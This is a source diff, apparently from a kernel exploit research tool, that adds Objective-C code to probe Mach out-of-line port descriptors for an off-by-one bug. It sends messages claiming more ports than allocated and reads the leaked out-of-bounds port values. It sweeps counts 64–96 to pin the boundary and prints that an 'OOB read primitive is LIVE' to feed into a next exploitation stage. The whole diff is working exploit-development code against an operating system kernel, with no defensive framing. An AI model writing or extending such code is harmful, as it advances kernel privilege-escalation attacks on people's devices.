@@ -99,6 +99,10 @@
     if (kr == KERN_SUCCESS) {
         mach_msg_body_t *rb = (mach_msg_body_t *)(rcv + sizeof(mach_msg_header_t));
         result[@"recv_desc_count"] = @(rb->msgh_descriptor_count);
+        // OOB oracle: kernel delivered more descriptors than we sent
+        if (rb->msgh_descriptor_count > count) {
+            result[@"oob_desc"] = @(rb->msgh_descriptor_count - count);
+        }
     }
     free(rcv);
     free(buf);
@@ -232,6 +236,35 @@
                                      0, (mach_msg_size_t)rcvTotal,
                                      port, 250, MACH_PORT_NULL);
         result[@"recv_kr"] = @(rkr);
+
+        // OOB read oracle: parse the received OOL descriptor and check
+        // whether the kernel delivered more ports than `real`.
+        if (rkr == KERN_SUCCESS) {
+            mach_msg_body_t *rb = (mach_msg_body_t *)(rcv + sizeof(mach_msg_header_t));
+            if (rb->msgh_descriptor_count >= 1) {
+                mach_msg_ool_ports_descriptor_t *rod =
+                    (mach_msg_ool_ports_descriptor_t *)(rcv + sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t));
+                result[@"recv_count"] = @(rod->count);
+                if (rod->count > real && rod->address != NULL) {
+                    unsigned int oob = rod->count - real;
+                    if (oob > 8) oob = 8;
+                    result[@"oob_slots"] = @(rod->count - real);
+                    mach_port_t *rports = (mach_port_t *)rod->address;
+                    NSMutableArray *oobVals = [NSMutableArray array];
+                    for (unsigned int i = 0; i < oob; i++) {
+                        unsigned int v = rports[real + i];
+                        [oobVals addObject:@(v)];
+                    }
+                    result[@"oob_values"] = oobVals;
+                }
+                // deallocate the kernel-allocated port array
+                if (rod->address != NULL && rod->count > 0) {
+                    mach_vm_deallocate(mach_task_self(),
+                                       (mach_vm_address_t)rod->address,
+                                       (mach_vm_size_t)(rod->count * sizeof(mach_port_t)));
+                }
+            }
+        }
         free(rcv);
     }
     free(buf);
@@ -297,6 +330,35 @@
         [report appendFormat:@"%@\n", r];
         [self journal:[NSString stringWithFormat:@"ool count=%u kr=%@/%@",
                        oolCounts[i], r[@"send_kr"], r[@"recv_kr"]]];
+    }
+
+    // Fine threshold sweep: every count from 64 to 96. This is where the
+    // off-by-one lives — find the exact MACH_SEND_INVALID_RIGHT boundary.
+    [report appendString:@"\n--- OOL count threshold sweep (64..96) ---\n"];
+    uint32_t lastOK = 0, threshold = 0, oobHits = 0;
+    for (uint32_t c = 64; c <= 96; c++) {
+        NSDictionary *r = [self sendOOLPortsCount:c realEntries:64 port:port sendRight:port];
+        [report appendFormat:@"%@\n", r];
+        [self journal:[NSString stringWithFormat:@"ool_sweep count=%u send_kr=%@ recv_kr=%@ recv_count=%@ oob=%@",
+                       c, r[@"send_kr"], r[@"recv_kr"], r[@"recv_count"], r[@"oob_slots"]]];
+        if ([r[@"send_kr"] intValue] == 0) {
+            lastOK = c;
+        } else if (threshold == 0) {
+            threshold = c;
+        }
+        if (r[@"oob_slots"] != nil) {
+            oobHits++;
+        }
+        usleep(2000);
+    }
+    [report appendFormat:@"\nthreshold analysis: last_ok=%u threshold=%u delta=%u oob_hits=%u\n",
+     lastOK, threshold, threshold > 64 ? threshold - 64 : 0, oobHits];
+    if (oobHits > 0) {
+        [report appendString:@"OOB transfer CONFIRMED — kernel delivered more ports than allocated.\n"];
+        [report appendString:@"=> OOB read primitive is LIVE. Feed to translate_receive bit-set.\n"];
+    } else if (threshold > 0) {
+        [report appendString:@"No OOB slots observed — kernel may clamp silently.\n"];
+        [report appendString:@"Next: debugserver watchpoints on the ports array alloc.\n"];
     }
 
     [report appendString:@"\n--- itable churn + burst (growth boundary) ---\n"];
